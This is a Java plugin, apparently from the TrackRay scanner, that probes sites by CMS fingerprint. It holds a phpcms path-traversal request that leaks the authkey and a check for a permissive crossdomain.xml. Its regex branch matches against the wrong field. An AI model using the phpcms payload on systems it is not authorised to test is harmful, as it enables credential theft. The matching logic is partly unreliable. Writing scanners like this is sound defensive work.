package com.trackray.module.auxiliary;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.bean.ResultItem;
import com.trackray.base.bean.Task;
import com.trackray.base.bean.Vulnerable;
import com.trackray.base.enums.FingerPrint;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.enums.VulnLevel;
import com.trackray.base.httpclient.Response;
import com.trackray.base.httpclient.ResponseStatus;
import com.trackray.base.plugin.CommonPlugin;
import lombok.Builder;
import lombok.Data;
import org.apache.commons.lang.StringUtils;
import org.apache.http.Header;
import org.javaweb.core.net.HttpRequest;
import org.javaweb.core.net.HttpResponse;
import org.javaweb.core.net.HttpURLRequest;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

@Rule(enable = false)
@Plugin(value = "simpleVulRule" ,title = "简单CMS漏洞检测规则" , author = "浅蓝")
public class SimpleVulRule extends CommonPlugin<List<Vulnerable>> {
    private String target;
    private Task task;
    private List<Vulnerable> vulns = new ArrayList<>();

    private List<Payloader> doSwitch(FingerPrint finger) {
        List<Payloader> loaders = new ArrayList<>();
        switch (finger) {
            case $phpcms:

                loaders.add(
                        Payloader.builder()
                                .url("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin")
                                .custom(
                                        new Custom() {
                                            @Override
                                            public boolean fun( HttpResponse response) throws Exception {
                                                return response.body().contains("aaaaa")?true:false;//如果响应体包含aaaaa则存在漏洞
                                            }
                                        }
                                ).vuln(Vulnerable.builder().level(VulnLevel.DANGER.getLevel()).vulName("phpcms authkey泄漏").build())
                                .build()
                );

                loaders.add(
                        Payloader.builder()
                                .url("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin")
                                .method(HttpRequest.Method.GET)
                                .containsStr("aaaaa")
                                .vuln(Vulnerable.builder().level(VulnLevel.DANGER.getLevel()).vulName("phpcms authkey泄漏").build()) //另一种实现方式
                                .build()
                );

                break;
            case $Discuz:
                break;
            default:
                /**
                 * 以上都没有匹配时执行
                 */

                loaders.add(
                        Payloader.builder()
                        .url("/crossdomain.xml")
                        .containsStr("domain=\"*\"")
                        .vuln(
                                Vulnerable.
                                        builder().
                                        level(VulnLevel.DANGER.getLevel()).
                                        vulName("crossdomain.xml 配置不当").build()
                        ).build()
                );

                break;
        }
        return loaders;
    }

    @Override
    public boolean check(Map param) {
        target = param.get("target").toString();
        if (param.containsKey("task"))
        {
            task = (Task) param.get("task");
        }
        return true;
    }

    @Override
    public List<Vulnerable> start() {
        if (!isNull(task)){
            ResultItem item = task.getResult().getItems().get(target);
            FingerPrint finger = item.getSystemInfo().getFinger();
            if (finger!=FingerPrint.unknown){
                test(doSwitch(finger));
            }
        }
        return vulns;
    }

    private void test(List<Payloader> payloaders) {
        for (Payloader payloader : payloaders) {

            HttpURLRequest req = payloader.getRequest();
            try {
                HttpResponse resp = null;
                if (req == null) {
                    req = new HttpURLRequest()
                            .url(payloader.url)
                            .method(payloader.method);
                    if (StringUtils.isNotBlank(payloader.data)) {
                        req.data(payloader.data);
                    }

                    if (payloader.header != null) {
                        req.header(payloader.header);
                    }

                    if (payloader.method == HttpRequest.Method.GET)
                        resp = req.get();
                    else
                        resp = req.post();

                }else{
                    resp = req.request();
                }


                if (payloader.getCustom()!=null){
                    try {
                        if (payloader.custom.fun( resp )){
                            addVul(payloader);
                        }
                    } catch (Exception e) {
                        continue;
                    }
                }else{


                    if (StringUtils.isNotBlank(payloader.containsStr)){
                        if (StringUtils.contains(resp.body() , payloader.containsStr)){
                            addVul(payloader);
                        }

                    }else if(StringUtils.isNotBlank(payloader.matche)){
                        if (resp.body().matches(payloader.containsStr)){
                            addVul(payloader);
                        }
                    }
                }


            }catch (Exception e){}


        }
    }
    private void addVul(Payloader payloader){
        if (!isNull(task)){
            task.getResult().getItems().get(target).getVulns().add(payloader.vuln);
        }
        payloader.vuln.setAffectsUrl(payloader.url);
        payloader.vuln.setRequest(payloader.data);
        vulns.add(payloader.vuln);
    }

    interface Custom{
        public boolean fun(HttpResponse response) throws Exception;
    }

    @Data
    @Builder
    static class Payloader{
        private HttpURLRequest request;
        private String url="";
        private HttpRequest.Method method = HttpRequest.Method.GET;
        private String data="";
        private Map<String,String > header;
        private String containsStr="";  //文字包含匹配
        private String matche = ""; //正则表达式匹配
        private Vulnerable vuln;
        private Custom custom;

    }
}
